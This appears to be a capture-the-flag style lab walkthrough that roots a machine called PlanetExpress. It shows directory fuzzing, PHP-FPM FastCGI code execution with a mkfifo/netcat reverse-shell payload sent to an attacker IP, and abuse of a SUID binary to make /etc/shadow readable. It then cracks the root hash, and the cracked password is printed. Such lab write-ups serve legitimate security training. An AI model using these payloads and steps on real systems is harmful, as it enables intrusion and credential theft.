## Summary

In this walkthrough, we will exploit an exposed PHP-FPM FastCGI implementation to gain an initial foothold. We will then escalate privileges by exploiting a misconfiguration in a SUID binary to read the root password hash and subsequently crack it in order to obtain a root shell.

This walkthrough uses the follow versions of tooling :

- `Kali 2022.2`
- `nmap 7.9.2`
- `John 1.9.0`
- `ffuf v.1.3.1`

## Enumeration

Let's start the enumeration process with a simple `Nmap` scan.

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap 192.168.120.158 -Pn       
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-09 23:37 EST
Nmap scan report for 192.168.120.158
Host is up (0.28s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9000/tcp open  cslistener

Nmap done: 1 IP address (1 host up) scanned in 32.24 seconds
```

This scan shows two services on their default ports: SSH on port 22 and HTTP on port 80. We also see an unknown service (cslistener) running on port 9000. Here, we used `-Pn` (No Ping) option to avoid host discovery through heavy probing. Only common ports are probed twice with this option.

Now, let's try to enumerate the HTTP service which is running on port 80 to grab some useful information for exploitation.

### HTTP Enumeration

From the Nmap scan result, we can see that the HTTP service is running on port 80. First, let's check whether we can open the web application by using a web browser and typing `http://192.168.120.158:80`. Unfortunately, we don't see anything of interest on the website. We will now brute force the directories of the target.

We can use a web application fuzzer like `ffuf` to brute force the directories. Here, we are using -c (to colorize the output), -w (to use a wordlist from localmachine), and -u (to provide target's URL) flags for our scan. The wordlist file contains a huge list of commonly used directory names. The scanner uses these directory names and tries to find a matching directory with the same name in the target system.

The default keyword for fuzzing is `FUZZ` which can be appended at the end of target URL. The `ffuf` scanner inserts the words from the wordlist in the place of `FUZZ` during the brute force attack.

```
┌──(kali㉿kali)-[~]
└─$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -u http://192.168.120.158/FUZZ -t 500                       

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.120.158/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/quickhits.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 500
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

/.htaccess_extra        [Status: 403, Size: 280, Words: 20, Lines: 10]
/.gitignore             [Status: 200, Size: 111, Words: 7, Lines: 16]
/.htaccess_sc           [Status: 403, Size: 280, Words: 20, Lines: 10]
/.htaccessBAK           [Status: 403, Size: 280, Words: 20, Lines: 10]
/.htaccess_orig         [Status: 403, Size: 280, Words: 20, Lines: 10]
/.htaccess.txt          [Status: 403, Size: 280, Words: 20, Lines: 10]
/.htaccess              [Status: 403, Size: 280, Words: 20, Lines: 10]
/.htaccess-dev          [Status: 403, Size: 280, Words: 20, Lines: 10]
/.htaccess.BAK          [Status: 403, Size: 280, Words: 20, Lines: 10]
/.htaccess-local        [Status: 403, Size: 280, Words: 20, Lines: 10]
/.htaccess-marco        [Status: 403, Size: 280, Words: 20, Lines: 10]
/.htaccess.bak          [Status: 403, Size: 280, Words: 20, Lines: 10]
/.htaccess.old          [Status: 403, Size: 280, Words: 20, Lines: 10]
/.htaccess.sample       [Status: 403, Size: 280, Words: 20, Lines: 10]
/.htaccess.save         [Status: 403, Size: 280, Words: 20, Lines: 10]
/.htaccess.bak1         [Status: 403, Size: 280, Words: 20, Lines: 10]
/.htaccess.orig         [Status: 403, Size: 280, Words: 20, Lines: 10]
/.hta                   [Status: 403, Size: 280, Words: 20, Lines: 10]
/.ht_wsr.txt            [Status: 403, Size: 280, Words: 20, Lines: 10]
/.htaccess~             [Status: 403, Size: 280, Words: 20, Lines: 10]
/.htgroup               [Status: 403, Size: 280, Words: 20, Lines: 10]
/.htpasswd-old          [Status: 403, Size: 280, Words: 20, Lines: 10]
/.htaccessOLD           [Status: 403, Size: 280, Words: 20, Lines: 10]
/.htpasswd_test         [Status: 403, Size: 280, Words: 20, Lines: 10]
/.htpasswds             [Status: 403, Size: 280, Words: 20, Lines: 10]
/.htusers               [Status: 403, Size: 280, Words: 20, Lines: 10]
/.htaccessOLD2          [Status: 403, Size: 280, Words: 20, Lines: 10]
/.htpasswd              [Status: 403, Size: 280, Words: 20, Lines: 10]
/config/                [Status: 403, Size: 280, Words: 20, Lines: 10]
/server-status/         [Status: 403, Size: 280, Words: 20, Lines: 10]
:: Progress: [2482/2482] :: Job [1/1] :: 1038 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
```

After observing the brute force scan results, only the `/config` directory looks interesting. Now we will attempt to brute force the sub directories that respond with a "200" status code. Here, we are using two more flags to specify the number of concurrent threads (-t), and only display results that match a "200" HTTP status code (-mc).

```
┌──(kali㉿kali)-[~]
└─$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -u http://192.168.120.158/config/FUZZ -t 500 -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.120.158/config/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/quickhits.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 500
 :: Matcher          : Response status: 200
________________________________________________

/.gitignore             [Status: 200, Size: 33, Words: 8, Lines: 2]
/config.yml             [Status: 200, Size: 812, Words: 96, Lines: 60]
:: Progress: [2482/2482] :: Job [1/1] :: 1504 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

From the scan results, we only see `/.gitignore` and `/config.yml` files that match the "200" status code. Let's have a look at the `config.yml` file using the `curl` command.

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.120.158/config/config.yml
##
# Basic
#
site_title: PlanetExpress
base_url: ~

rewrite_url: ~
debug: true
timezone: ~
locale: ~

##
# Theme
#
theme: launch
themes_url: ~

theme_config:
    widescreen: false
twig_config:
    autoescape: html
    strict_variables: false
    charset: utf-8
    debug: ~
    cache: false
    auto_reload: true

##
# Content
#
date_format: %D %T
pages_order_by_meta: planetexpress 

pages_order_by: alpha
pages_order: asc
content_dir: ~
content_ext: .md
content_config:
    extra: true
    breaks: false
    escape: false
    auto_urls: true
assets_dir: assets/
assets_url: ~

##
# Plugins: https://github.com/picocms/Pico/tree/master/plugins
#
plugins_url: ~
DummyPlugin.enabled: false

PicoOutput:
  formats: [content, raw, json]

## 
# Self developed plugin for PlanetExpress
#
#PicoTest:
#  enabled: true
```

The configuration file contains some interesting information, a github link to [Pico](https://github.com/picocms/Pico/tree/master/plugins) CMS reveals the directory structure and that a self-developed plugin called `PicoTest` is enabled. Since we know that the directory structure is `/plugins`, let's have a look at the `PicoTest` plugin.

![PicoTest](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_99_image_1_P9qrQ9rj.png)

PicoTest

`PicoTest.php` is just a phpinfo page which reveals that the Server API is `FPM/FastCGI` which uses port 9000 by default.

## Exploitation

### PHP-FPM/FastCGI Remote Code Execution

Since we know that `FPM/FastCGI` is running on port 9000, we do a bit of research and find the [Fastcgi PHP-FPM Client && Code Execution](https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75) script on GitHub. To execute arbitrary PHP code, we have to know the path that shows where the files are stored on the server. Luckily we find a phpinfo page which reveals the entire path.

![phpinfo](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_99_image_2_2c7WBYCT.png)

phpinfo

Let's try executing the `id` command using the PHP command `system`.

```
┌──(kali㉿kali)-[~]
└─$ python3 fpm.py -c "<?php system('id'); ?>" -p 9000 192.168.120.158 /var/www/html/planetexpress/plugins/PicoTest.php | head -n 10
PHP message: PHP Warning:  system() has been disabled for security reasons in php://input on line 1Content-type: text/html; charset=UTF-8

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<style type="text/css">
body {background-color: #fff; color: #222; font-family: sans-serif;}
pre {margin: 0; font-family: monospace;}
a:link {color: #009; text-decoration: none; background-color: #fff;}
a:hover {text-decoration: underline;}
table {border-collapse: collapse; border: 0; width: 934px; box-shadow: 1px 2px 3px #ccc;}
Exception ignored in: <_io.TextIOWrapper name='<stdout>' mode='w' encoding='utf-8'>
BrokenPipeError: [Errno 32] Broken pipe
```

We can also see that some PHP functions are disabled in the `disable_functions` row of the phpinfo page:

```plaintext
system,exec,shell_exec,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,
```

Luckily, `passthru` is not disabled and can be used to execute arbitrary OS commands. We will use the following payload (in our exploit) to get a reverse shell. Note that we used backslashes in the payload to escape the double quotes.

```
  rm -f /tmp/x; mkfifo /tmp/x; /bin/sh -c \"cat /tmp/x | /bin/sh -i 2>&1 | nc 192.168.118.18 80 > /tmp/x\"
```

Now, let's set up a `Netcat` listener with -n (numeric-only IP addresses, no DNS), -l (listen mode, for inbound connects), -v (verbose [use twice to be more verbose]), and -p ( local port number) flags on port 80.

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 80                         
listening on [any] 80 ...
```

Now we can launch the exploit.

```
┌──(kali㉿kali)-[~]
└─$ python3 fpm.py -c "<?php passthru('rm -f /tmp/x; mkfifo /tmp/x; /bin/sh -c \"cat /tmp/x | /bin/sh -i 2>&1 | nc 192.168.118.18 80 > /tmp/x\"'); ?>" -p 9000 192.168.120.158 /var/www/html/planetexpress/plugins/PicoTest.php
```

We catch a reverse shell and upgrade to a full TTY using Python.

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 80                                                                                 
listening on [any] 80 ...
connect to [192.168.118.18] from (UNKNOWN) [192.168.120.158] 49198
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@planetexpress:~/html/planetexpress/plugins$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Escalation

### Abusing SUID binary

After a bit of enumeration, we see an unusual binary called `relayd` with the SUID bit set.

```
www-data@planetexpress:~/html/planetexpress/plugins$ find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
<find / -perm -g=s -o -perm -u=s -type f 2>/dev/null 
/usr/local/lib/python3.7
/usr/local/lib/python3.7/dist-packages
/usr/local/lib/python2.7
/usr/local/lib/python2.7/site-packages
/usr/local/lib/python2.7/dist-packages
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/sbin/relayd
/usr/sbin/unix_chkpwd
/usr/bin/dotlockfile
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
/usr/bin/expiry
/usr/bin/ssh-agent
/usr/bin/bsd-write
/usr/bin/chage
/usr/bin/crontab
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/chfn
/usr/bin/wall
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
/run/log/journal
/run/log/journal/dfeea3a38b804ead8bd9a54e8c7e2bad
/var/local
/var/mail

www-data@planetexpress:~/html/planetexpress/plugins$ ls -l /usr/sbin/relayd
ls -l /usr/sbin/relayd
-rws---r-x 1 root root 3644754 Jan 10 23:25 /usr/sbin/relayd
```

Let's have a look at the help menu of `relayd`.

```
www-data@planetexpress:~/html/planetexpress/plugins$ /usr/sbin/relayd --help
/usr/sbin/relayd --help
Usage: relayd [options] [actions]
Actions:
  default action      start daemon
  -h                  show this help message
  -v                  show version info
  -k                  kill running daemon
  -s                  get running status
  -U                  hup (reload configs)
  -a [service]        add service for relay
  -r [service]        remove service for relay
  -i                  get real client ip
  -b [up|down]        broadcast the DS boot state
  -R                  reopen the log file
Options:
  -C [file]           read config from file
  -d                  enable debug mode. will not run in background
  -P [file]           set pid file for daemon
  -g [ip]             remote source ip
  -n [port]           remote source port
```

After some close observation, we can see that the program reads config from files with the `-C` parameter and that the program requires a `json` file.

```
www-data@planetexpress:/tmp$ touch temp
touch temp
www-data@planetexpress:/tmp$ /usr/sbin/relayd -C temp
/usr/sbin/relayd -C temp
[ERR] 2022-03-10 00:34:00 config.cpp:1539 write
[ERR] 2022-03-10 00:34:00 config.cpp:1213 open failed [/usr/etc/relayd/misc.conf.tmp.12217]
[ERR] 2022-03-10 00:34:00 config.cpp:1189 bad json format [temp]
[ERR] 2022-03-10 00:34:00 invalid config file
```

We can also see that the file permissions have been changed to 0644. To confirm this, we can use `strace`.

```
www-data@planetexpress:/tmp$ touch tempfile
touch tempfile

www-data@planetexpress:/tmp$ strace /usr/sbin/relayd -C tempfile
...
...
fchmodat(AT_FDCWD, "tempfile", 0644)    = 0
...
...
```

Since the binary has the SUID bit set, we can abuse this misconfiguration to modify file permissions and read `/etc/shadow`.

```
www-data@planetexpress:/tmp$ ls -l /etc/shadow
ls -l /etc/shadow
-rw-r----- 1 root shadow 940 Jan 10 23:25 /etc/shadow
www-data@planetexpress:/tmp$ /usr/sbin/relayd -C /etc/shadow
/usr/sbin/relayd -C /etc/shadow
[ERR] 2022-03-10 00:39:08 config.cpp:1539 write
[ERR] 2022-03-10 00:39:08 config.cpp:1213 open failed [/usr/etc/relayd/misc.conf.tmp.12217]
[ERR] 2022-03-10 00:39:08 config.cpp:1189 bad json format [/etc/shadow]
[ERR] 2022-03-10 00:39:08 invalid config file
www-data@planetexpress:/tmp$ ls -l /etc/shadow
ls -l /etc/shadow
-rw-r--r-- 1 root shadow 940 Jan 10 23:25 /etc/shadow
```

Now we can run the following command to grab the root password hash from `/etc/shadow`.

```
www-data@planetexpress:/tmp$ cat /etc/shadow | grep root
cat /etc/shadow | grep root
root:$6$vkAzDkveIBc6PmO1$y8QyGSMqJEUxsDfdsX3nL5GsW7p/1mn5pmfz66RBn.jd7gONn0vC3xf8ga33/Fq57xMuqMquhB9MoTRpTTHVO1:19003:0:99999:7:::
```

Let's crack the password hash with `john`.

```
┌──(kali㉿kali)-[~]
└─$ unshadow passwd.txt shadow.txt > unshadow.txt
                                                                                                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
neverwant2saygoodbye (root)     
1g 0:00:05:14 DONE (2022-03-10 00:50) 0.003179g/s 2676p/s 2676c/s 2676C/s newme11..nevada99
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now we have obtained the root user's password. Let's try to login as root using the password `neverwant2saygoodbye`.

```
www-data@planetexpress:/tmp$ su root
su root
Password: neverwant2saygoodbye

root@planetexpress:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)
```